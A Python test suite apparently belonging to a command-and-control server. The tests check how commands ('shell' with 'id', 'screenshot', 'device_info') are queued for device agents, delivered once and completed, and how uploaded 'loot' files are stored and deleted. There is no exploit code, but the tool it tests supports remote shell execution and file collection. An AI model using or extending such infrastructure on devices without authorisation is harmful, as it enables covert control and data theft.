"""Command queue lifecycle: queue, drain, deliver, complete."""

import io
from pathlib import Path

from conftest import API_KEY, OPERATOR_PASSWORD
from database import db
from models import Command

HEADERS = {"X-Api-Key": API_KEY}


def _operator(client):
    client.post("/login", data={"password": OPERATOR_PASSWORD})
    token = client.get("/api/session").get_json()["csrf_token"]
    client.environ_base["HTTP_X_CSRF_TOKEN"] = token
    return client


def _queue(client, dev_pk, ctype="device_info", args=None):
    r = client.post(f"/api/device/{dev_pk}/command",
                    json={"type": ctype, "args": args or {}})
    assert r.status_code == 200, r.data
    return r.get_json()


def test_queueing_creates_pending_command(app, client, make_device):
    dev_pk = make_device()
    payload = _queue(_operator(client), dev_pk)

    assert payload["pushed"] is False
    assert payload["status"] == "pending"

    with app.app_context():
        cmd = db.session.get(Command, payload["id"])
        assert cmd.device_id == dev_pk
        assert cmd.status == "pending"
        assert cmd.delivered_at is None


def test_unknown_command_type_is_rejected(client, make_device):
    dev_pk = make_device()
    op = _operator(client)
    r = op.post(f"/api/device/{dev_pk}/command", json={"type": "rm_rf"})
    assert r.status_code == 400


def test_non_dict_args_rejected(client, make_device):
    dev_pk = make_device()
    op = _operator(client)
    r = op.post(f"/api/device/{dev_pk}/command",
                json={"type": "device_info", "args": ["not", "a", "dict"]})
    assert r.status_code == 400


def test_push_alias_behaves_identically(app, client, make_device):
    dev_pk = make_device()
    op = _operator(client)
    r = op.post(f"/api/device/{dev_pk}/push", json={"type": "device_info"})
    assert r.status_code == 200
    assert r.get_json()["status"] == "pending"


def test_poll_delivers_once_and_marks_sent(app, client, make_device):
    dev_pk = make_device("dev-drain")
    op = _operator(client)
    payload = _queue(op, dev_pk, "screenshot")

    first = client.post("/api/agent/poll", headers=HEADERS,
                                   json={"device_id": "dev-drain"}).get_json()
    assert [c["id"] for c in first["commands"]] == [payload["id"]]

    second = client.post("/api/agent/poll", headers=HEADERS,
                                    json={"device_id": "dev-drain"}).get_json()
    assert second["commands"] == []

    with app.app_context():
        cmd = db.session.get(Command, payload["id"])
        assert cmd.status == "sent"
        assert cmd.delivered_at is not None


def test_result_payload_is_truncated(app, client, make_device):
    dev_pk = make_device("dev-big")
    op = _operator(client)
    payload = _queue(op, dev_pk, "shell", {"cmd": "id"})

    client.post("/api/agent/result", headers=HEADERS, json={
        "device_id": "dev-big",
        "command_id": payload["id"],
        "success": True,
        "result": {"out": "x" * 2_000_000},
    })

    with app.app_context():
        cmd = db.session.get(Command, payload["id"])
        assert len(cmd.result) <= 512 * 1024


def test_command_history_is_newest_first(app, client, make_device):
    dev_pk = make_device("dev-history")
    op = _operator(client)
    ids = [_queue(op, dev_pk)["id"] for _ in range(5)]

    listed = op.get(f"/api/device/{dev_pk}/commands").get_json()
    assert [c["id"] for c in listed] == sorted(ids, reverse=True)


def test_deleting_device_removes_commands_and_files_from_disk(app, client, make_device):
    from c2.file_handler import safe_join
    from config import Config

    dev_pk = make_device("dev-delete")
    op = _operator(client)
    _queue(op, dev_pk)

    client.post(
        "/api/agent/upload",
        data={"device_id": "dev-delete", "category": "misc",
              "file": (io.BytesIO(b"bytes" * 100), "loot.bin")},
        headers=HEADERS,
        content_type="multipart/form-data",
    )

    stored = Path(safe_join(Config.UPLOAD_FOLDER, "misc", "dev-delete"))
    assert stored.is_dir() and any(stored.iterdir())

    r = op.delete(f"/api/device/{dev_pk}")
    assert r.status_code == 200
    assert r.get_json()["bytes_freed"] > 0

    with app.app_context():
        assert Command.query.filter_by(device_id=dev_pk).count() == 0
    assert not stored.exists()